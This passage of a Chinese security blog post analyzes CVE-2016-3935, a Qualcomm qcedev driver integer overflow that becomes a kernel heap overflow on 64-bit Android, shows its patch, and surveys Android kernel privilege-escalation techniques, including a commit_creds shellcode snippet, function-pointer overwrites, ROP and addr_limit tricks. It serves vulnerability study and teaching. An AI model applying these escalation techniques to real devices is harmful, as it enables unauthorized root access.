class="line">                                <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_sha_params(&amp;qcedev_areq.sha_op_req, podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">...</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_SHA_UPDATE_REQ:</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_sha_params(&amp;qcedev_areq.sha_op_req, podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">...</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">return</span> -ENOTTY;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 command 为下面几个case 里都会调用 <strong>qcedev_check_sha_params</strong> 函数对用户态传入的数据进行合法性校验</p>
<ul>
<li>QCEDEV_IOCTL_SHA_INIT_REQ</li>
<li>QCEDEV_IOCTL_SHA_UPDATE_REQ</li>
<li>QCEDEV_IOCTL_SHA_FINAL_REQ</li>
<li>QCEDEV_IOCTL_GET_SHA_REQ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_check_sha_params</span><span class="params">(struct qcedev_sha_op_req *req,</span></span></span><br><span class="line"><span class="function"><span class="params">                                                struct qcedev_control *podev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">uint32_t</span> total = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">uint32_t</span> i;</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Check for sum of all src length is equal to data_len  */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>, total = <span class="number">0</span>; i &lt; req-&gt;entries; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (req-&gt;data[i].len &gt; ULONG_MAX - total) &#123;</span><br><span class="line">                        pr_err(<span class="string">"%s: Integer overflow on total req buf length\n"</span>,</span><br><span class="line">                                __func__);</span><br><span class="line">                        <span class="keyword">goto</span> sha_error;</span><br><span class="line">                &#125;</span><br><span class="line">                total += req-&gt;data[i].len;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (total != req-&gt;data_len) &#123;</span><br><span class="line">                pr_err(<span class="string">"%s: Total src(%d) buf size != data_len (%d)\n"</span>,</span><br><span class="line">                        __func__, total, req-&gt;data_len);</span><br><span class="line">                <span class="keyword">goto</span> sha_error;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">sha_error:</span><br><span class="line">        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>qcedev_check_sha_params</strong> 对用户态传入的数据做多种校验，其中一项是对传入的数据数组挨个累加长度，并对总长度做整数溢出校验</p>
<p>问题在于， <strong>req-&gt;data[i].len</strong> 是 uint32_t 类型， 总长度 <strong>total</strong> 也是 uint32_t 类型，uint32_t 的上限是 UINT_MAX, 而这里使用了 ULONG_MAX 来做校验</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">usr/include/limits.h</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Maximum value an `unsigned long int' can hold.  (Minimum is 0.)  */</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">if</span> __WORDSIZE == 64</span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> ULONG_MAX    18446744073709551615UL</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">else</span></span></span><br><span class="line"><span class="meta">#   <span class="meta-keyword">define</span> ULONG_MAX    4294967295UL</span></span><br><span class="line"><span class="meta">#  <span class="meta-keyword">endif</span></span></span><br></pre></td></tr></table></figure>

<p>注意到：</p>
<ul>
<li>32 bit 系统， <strong>UINT_MAX = ULONG_MAX</strong></li>
<li>64 bit 系统， <strong>UINT_MAX ！= ULONG_MAX</strong></li>
</ul>
<p>所以这里的整数溢出校验 <code>在64bit系统是无效的</code>，即在 64bit 系统，req-&gt;data 数组项的总长度可以整数溢出，这里还无法确定这个整数溢出能造成什么后果。</p>
<p>下面看看有何影响，我们选取 case <strong>QCEDEV_IOCTL_SHA_UPDATE_REQ</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">qcedev_ioctl</span><span class="params">(struct file *file, <span class="keyword">unsigned</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">...     </span><br><span class="line">        <span class="keyword">case</span> QCEDEV_IOCTL_SHA_UPDATE_REQ:</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="class"><span class="keyword">struct</span> <span class="title">scatterlist</span> <span class="title">sg_src</span>;</span></span><br><span class="line">                <span class="keyword">if</span> (!access_ok(VERIFY_WRITE, (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (__copy_from_user(&amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        (<span class="keyword">void</span> __user *)arg,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                <span class="keyword">if</span> (qcedev_check_sha_params(&amp;qcedev_areq.sha_op_req, podev))</span><br><span class="line">                        <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                qcedev_areq.op_type = QCEDEV_CRYPTO_OPER_SHA;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (qcedev_areq.sha_op_req.alg == QCEDEV_ALG_AES_CMAC) &#123;</span><br><span class="line">                        err = qcedev_hash_cmac(&amp;qcedev_areq, handle, &amp;sg_src);</span><br><span class="line">                        <span class="keyword">if</span> (err)</span><br><span class="line">                                <span class="keyword">return</span> err;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (handle-&gt;sha_ctxt.init_done == <span class="literal">false</span>) &#123; </span><br><span class="line">                                pr_err(<span class="string">"%s Init was not called\n"</span>, __func__);</span><br><span class="line">                                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">                        &#125;</span><br><span class="line">                        err = qcedev_hash_update(&amp;qcedev_areq, handle, &amp;sg_src);</span><br><span class="line">                        <span class="keyword">if</span> (err)</span><br><span class="line">                                <span class="keyword">return</span> err;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">memcpy</span>(&amp;qcedev_areq.sha_op_req.digest[<span class="number">0</span>],</span><br><span class="line">                                &amp;handle-&gt;sha_ctxt.digest[<span class="number">0</span>],</span><br><span class="line">                                handle-&gt;sha_ctxt.diglen);</span><br><span class="line">                <span class="keyword">if</span> (__copy_to_user((<span class="keyword">void</span> __user *)arg, &amp;qcedev_areq.sha_op_req,</span><br><span class="line">                                        <span class="keyword">sizeof</span>(struct qcedev_sha_op_req)))</span><br><span class="line">                        <span class="keyword">return</span> -EFAULT;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">...</span><br><span class="line">        <span class="keyword">return</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>qcedev_areq.sha_op_req.alg</strong> 的值也是应用层控制的，当等于 <strong>QCEDEV_ALG_AES_CMAC</strong> 时，进入函数 <strong>qcedev_hash_cmac</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="number">868</span> <span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">qcedev_hash_cmac</span><span class="params">(struct qcedev_async_req *qcedev_areq,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">869</span>                                         struct qcedev_handle *handle,</span></span></span><br><span class="line"><span class="function"><span class="params"> <span class="number">870</span>                                         struct scatterlist *sg_src)</span></span></span><br><span class="line"><span class="function"> 871 </span>&#123;</span><br><span class="line"> <span class="number">872</span>         <span class="keyword">int</span> err = <span class="number">0</span>;</span><br><span class="line"> <span class="number">873</span>         <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line"> <span class="number">874</span>         <span class="keyword">uint32_t</span> total;</span><br><span class="line"> <span class="number">875</span> </span><br><span class="line"> <span class="number">876</span>         <span class="keyword">uint8_t</span> *user_src = <span class="literal">NULL</span>;</span><br><span class="line"> <span class="number">877</span>         <span class="keyword">uint8_t</span> *k_src = <span class="literal">NULL</span>;</span><br><span class="line"> <span class="number">878</span>         <span class="keyword">uint8_t</span> *k_buf_src = <span class="literal">NULL</span>;</span><br><span class="line"> <span class="number">879</span> </span><br><span class="line"> <span class="number">880</span>         total = qcedev_areq-&gt;sha_op_req.data_len;</span><br><span class="line"> <span class="number">881</span> </span><br><span class="line"> <span class="number">882</span>         <span class="comment">/* verify address src(s) */</span></span><br><span class="line"> <span class="number">883</span>         <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; qcedev_areq-&gt;sha_op_req.entries; i++)</span><br><span class="line"> <span class="number">884</span>                 <span class="keyword">if</span> (!access_ok(VERIFY_READ,</span><br><span class="line"> <span class="number">885</span>                         (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.data[i].vaddr,</span><br><span class="line"> <span class="number">886</span>                         qcedev_areq-&gt;sha_op_req.data[i].len))</span><br><span class="line"> <span class="number">887</span>                         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">888</span> </span><br><span class="line"> <span class="number">889</span>         <span class="comment">/* Verify Source Address */</span></span><br><span class="line"> <span class="number">890</span>         <span class="keyword">if</span> (!access_ok(VERIFY_READ,</span><br><span class="line"> <span class="number">891</span>                                 (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.authkey,</span><br><span class="line"> <span class="number">892</span>                                 qcedev_areq-&gt;sha_op_req.authklen))</span><br><span class="line"> <span class="number">893</span>                         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">894</span>         <span class="keyword">if</span> (__copy_from_user(&amp;handle-&gt;sha_ctxt.authkey[<span class="number">0</span>],</span><br><span class="line"> <span class="number">895</span>                                 (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.authkey,</span><br><span class="line"> <span class="number">896</span>                                 qcedev_areq-&gt;sha_op_req.authklen))</span><br><span class="line"> <span class="number">897</span>                 <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">898</span> </span><br><span class="line"> <span class="number">899</span> </span><br><span class="line"> <span class="number">900</span>         k_buf_src = kmalloc(total, GFP_KERNEL);</span><br><span class="line"> <span class="number">901</span>         <span class="keyword">if</span> (k_buf_src == <span class="literal">NULL</span>) &#123;</span><br><span class="line"> <span class="number">902</span>                 pr_err(<span class="string">"%s: Can't Allocate memory: k_buf_src 0x%lx\n"</span>,</span><br><span class="line"> <span class="number">903</span>                                 __func__, (<span class="keyword">uintptr_t</span>)k_buf_src);</span><br><span class="line"> <span class="number">904</span>                 <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"> <span class="number">905</span>         &#125;</span><br><span class="line"> <span class="number">906</span> </span><br><span class="line"> <span class="number">907</span>         k_src = k_buf_src;</span><br><span class="line"> <span class="number">908</span> </span><br><span class="line"> <span class="number">909</span>         <span class="comment">/* Copy data from user src(s) */</span></span><br><span class="line"> <span class="number">910</span>         user_src = (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.data[<span class="number">0</span>].vaddr;</span><br><span class="line"> <span class="number">911</span>         <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; qcedev_areq-&gt;sha_op_req.entries; i++) &#123;</span><br><span class="line"> <span class="number">912</span>                 user_src =</span><br><span class="line"> <span class="number">913</span>                         (<span class="keyword">void</span> __user *)qcedev_areq-&gt;sha_op_req.data[i].vaddr;</span><br><span class="line"> <span class="number">914</span>                 <span class="keyword">if</span> (user_src &amp;&amp; __copy_from_user(k_src, (<span class="keyword">void</span> __user *)user_src,</span><br><span class="line"> <span class="number">915</span>                                 qcedev_areq-&gt;sha_op_req.data[i].len)) &#123;</span><br><span class="line"> <span class="number">916</span>                         kzfree(k_buf_src);</span><br><span class="line"> <span class="number">917</span>                         <span class="keyword">return</span> -EFAULT;</span><br><span class="line"> <span class="number">918</span>                 &#125;</span><br><span class="line"> <span class="number">919</span>                 k_src += qcedev_areq-&gt;sha_op_req.data[i].len;</span><br><span class="line"> <span class="number">920</span>         &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在函数 <strong>qcedev_hash_cmac</strong> 里， line 900 申请的堆内存 <strong>k_buf_src</strong> 的长度是 <strong>qcedev_areq-&gt;sha_op_req.data_len</strong> ，即请求数组里所有项的长度之和</p>
<p>然后在 line 911 ~ 920 的循环里，会将请求数组 <strong>qcedev_areq-&gt;sha_op_req.data[]</strong> 里的元素挨个拷贝到堆 <strong>k_buf_src</strong> 里，由于前面存在的整数溢出漏洞，这里会转变成为一个堆溢出漏洞，至此漏洞坐实。</p>
<h3 id="CVE-2016-3935-漏洞补丁"><a href="#CVE-2016-3935-漏洞补丁" class="headerlink" title="CVE-2016-3935 漏洞补丁 [^]"></a>CVE-2016-3935 漏洞补丁 <a href="#top">[^]</a></h3><p><span id="CVE-2016-3935-patch"></span> </p>
<p><img src="/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/3935patch.png" alt></p>
<p>这个 <a href="https://source.codeaurora.org/quic/la/kernel/msm-3.18/commit/?id=5f69ccf3b011c1d14a1b1b00dbaacf74307c9132" target="_blank" rel="noopener">漏洞补丁</a> 也很直观，就是在做整数溢出时，将 ULONG_MAX 改成了 U32_MAX, 这种因为系统由32位升级到64位导致的代码漏洞，是 2016 年的一类常见漏洞</p>
<p>下面进入漏洞利用分析</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用 [^]"></a>漏洞利用 <a href="#top">[^]</a></h2><h3 id="android-kernel-漏洞利用基础"><a href="#android-kernel-漏洞利用基础" class="headerlink" title="android kernel 漏洞利用基础"></a>android kernel 漏洞利用基础</h3><p>在介绍本文两个漏洞的利用之前，先回顾一下 android kernel 漏洞利用的基础知识</p>
<h4 id="什么是提权"><a href="#什么是提权" class="headerlink" title="什么是提权 [^]"></a>什么是提权 <a href="#top">[^]</a></h4><p><span id="what-is-kernel-exp"></span> </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include/linux/sched.h</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line">        <span class="keyword">volatile</span> <span class="keyword">long</span> state;    <span class="comment">/* -1 unrunnable, 0 runnable, &gt;0 stopped */</span></span><br><span class="line">        <span class="keyword">void</span> *<span class="built_in">stack</span>;</span><br><span class="line">...</span><br><span class="line"><span class="comment">/* process credentials */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">real_cred</span>;</span> <span class="comment">/* objective and real subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>  <span class="comment">/* effective (overridable) subjective task</span></span><br><span class="line"><span class="comment">                                         * credentials (COW) */</span></span><br><span class="line">        <span class="keyword">char</span> comm[TASK_COMM_LEN]; <span class="comment">/* executable name excluding path</span></span><br><span class="line"><span class="comment">                                     - access with [gs]et_task_comm (which lock</span></span><br><span class="line"><span class="comment">                                       it with task_lock())</span></span><br><span class="line"><span class="comment">                                     - initialized normally by setup_new_exec */</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>linux kernel 里，进程由 <strong>struct task_struct</strong> 表示，进程的权限由该结构体的两个成员 <strong>real_cred</strong> 和 <strong>cred</strong> 表示</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">include/linux/cred.h</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        usage;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">        <span class="keyword">atomic_t</span>        subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">        <span class="keyword">void</span>            *put_addr;</span><br><span class="line">        <span class="keyword">unsigned</span>        magic;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC      0x43736564</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">        <span class="keyword">kuid_t</span>          uid;            <span class="comment">/* real UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          gid;            <span class="comment">/* real GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          suid;           <span class="comment">/* saved UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          sgid;           <span class="comment">/* saved GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          euid;           <span class="comment">/* effective UID of the task */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          egid;           <span class="comment">/* effective GID of the task */</span></span><br><span class="line">        <span class="keyword">kuid_t</span>          fsuid;          <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">        <span class="keyword">kgid_t</span>          fsgid;          <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>所谓提权，就是修改进程的 <strong>real_cred/cred</strong> 这两个结构体的各种 <strong>id</strong> 值，随着缓解措施的不断演进，完整的提权过程还需要修改其他一些内核变量的值，但是最基础的提权还是修改本进程的 cred, 这个任务又可以分解为多个问题：</p>
<ul>
<li>怎么找到目标 cred ?</li>
<li>cred 所在内存页面是否可写？</li>
<li>如何利用漏洞往 cred 所在地址写值？</li>
</ul>
<h4 id="利用方法回顾"><a href="#利用方法回顾" class="headerlink" title="利用方法回顾 [^]"></a>利用方法回顾 <a href="#top">[^]</a></h4><p><span id="android-kernel-exp"></span> </p>
<p><img src="/2017/08/07/qualcomm-crypto-engine-vulnerabilities-exploits/exphistory.png" alt></p>
<p><a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">[图片来自]</a></p>
<p>上图是最近若干年围绕 android kernel 漏洞利用和缓解的简单回顾，</p>
<ul>
<li><p>09 ~ 10 年的时候，由于没有对 mmap 的地址范围做任何限制，应用层可以映射0页面，null pointer deref 漏洞在当时也是可以做利用的，后面针对这种漏洞推出了 <strong>mmap_min_addr</strong> 限制，目前 null pointer deref 漏洞一般只能造成 dos.  </p>
</li>
<li><p>11 ~ 13 年的时候，常用的提权套路是从 <strong>/proc/kallsyms</strong> 搜索符号 <strong>commit_creds</strong> 和 <strong>prepare_kernel_cred</strong> 的地址，然后在用户态通过这两个符号构造一个提权函数(如下)，</p>
</li>
</ul>
<pre><code><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">shellcode:</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">obtain_root_privilege_by_commit_creds(<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line"> 		commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></code></pre><p>可以看到，这个阶段的用户态 shellcode 非常简单, 利用漏洞改写内核某个函数指针(最常见的就是 <strong>ptmx</strong> 驱动的 <strong>fsync</strong> 函数)将其实现替换为用户态的函数, 最后在用户态调用被改写的函数, 这样的话从内核直接执行用户态的提权函数完成提权</p>
<p>这种方法在开源root套件 <a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="noopener">android_run_root_shell</a> 得到了充分提现 </p>
<p>后来，内核推出了<strong>kptr_restrict/dmesg_restrict</strong> 措施使得默认配置下无法从 <strong>/proc/kallsyms</strong> 等接口搜索内核符号的地址</p>
<p>但是这种缓解措施很容易绕过, <a href="https://github.com/android-rooting-tools/android_run_root_shell" target="_blank" rel="noopener">android_run_root_shell</a> 里提供了两种方法:</p>
<ol>
<li><p>通过一些内存 pattern 直接在内存空间里搜索符号地址，从而得到 <strong>commit_creds/prepare_kernel_cred</strong> 的值;<br><a href="https://github.com/android-rooting-tools/libkallsyms/blob/aa38ae78145724a2a330c1bab620cf3df7c3f6ad/kallsyms_in_memory.c" target="_blank" rel="noopener">libkallsyms:get_kallsyms_in_memory_addresses</a> </p>
</li>
<li><p>放弃使用 <strong>commit_creds/prepare_kernel_cred</strong> 这两个内核函数，从内核里直接定位到 <strong>task_struct 和 cred</strong> 结构并改写<br><a href="https://github.com/android-rooting-tools/android_run_root_shell/blob/master/main.c" target="_blank" rel="noopener">obtain_root_privilege_by_modify_task_cred</a> </p>
</li>
</ol>
<ul>
<li>2013 推出 text RO 和 PXN 等措施，通过漏洞改写内核代码段或者直接跳转到用户态执行用户态函数的提权方式失效了, <strong>android_run_root_shell</strong> 这个项目里的方法大部分已经失效, 在 PXN 时代，主要的提权思路是使用rop </li>
</ul>
<p>具体的 <strong>rop</strong> 技巧有几种，</p>
<ol>
<li>下面两篇文章讲了基本的 <strong>linux kernel ROP</strong> 技巧</li>
</ol>
<p><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-1)/" target="_blank" rel="noopener">Linux Kernel ROP - Ropping your way to # (Part 1)</a></p>
<p><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Linux-Kernel-ROP---Ropping-your-way-to---(Part-2)/" target="_blank" rel="noopener">Linux Kernel ROP - Ropping your way to # (Part 2)</a></p>
<p><img src="https://npercoco.typepad.com/.a/6a0133f264aa62970b01b7c86b399a970b-800wi" alt></p>
<p>可以看到这两篇文章的方法是搜索一些 <strong>rop 指令</strong> ，然后用它们串联 <strong>commit_creds/prepare_kernel_cred</strong>, 是对上一阶段思路的自然延伸。</p>
<ol start="2">
<li><p>使用 rop 改写 <strong>addr_limit</strong> 的值，破除本进程的系统调用 <strong>access_ok</strong> 校验，然后通过一些函数如 <a href="https://github.com/hagurekamome/RootkitApp/blob/master/jni/getroot.c" target="_blank" rel="noopener">ptrace_write_value_at_address</a> 直接读写内核来提权, 将 selinux_enforcing 变量写0关闭 selinux  </p>
</li>
<li><p>大名鼎鼎的 <a href="https://www.blackhat.com/docs/eu-14/materials/eu-14-Kemerlis-Ret2dir-Deconstructing-Kernel-Isolation.pdf" target="_blank" rel="noopener">Ret2dir</a> bypass PXN</p>
</li>
<li><p>还有就是本文使用的思路，用漏洞重定向内核驱动的 <strong>xxx_operations</strong> 结构体指针到应用层，再用 rop 地址填充应用层的伪 <strong>xxx_operations</strong> 里的函数实现</p>
</li>
<li><p>还有一些 2017 新出来的绕过缓解措施的技巧，<a href="http://powerofcommunity.net/poc2016/x82.pdf" target="_blank" rel="noopener">参考</a></p>
</li>
</ol>
<ul>
<li>进入2017年，更多的漏洞缓解措施正在被开发和引进，谷歌的nick正在主导开发的项目 <a href="https://kernsec.org/wiki/index.php/Kernel_Self_Protection_Project/Work" target="_blank" rel="noopener">Kernel_Self_Protection_Project</a> 对内核漏洞提权方法进行了分类整理，如下</li>
</ul>
<ul>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Kernel_location" target="_blank" rel="noopener">Kernel location</a></li>
<li><a href="https://kernsec.org/wiki/index.php/Exploit_Methods/Text_overwrite" target="_blank" rel="noopener">Text overwrite</a></li>
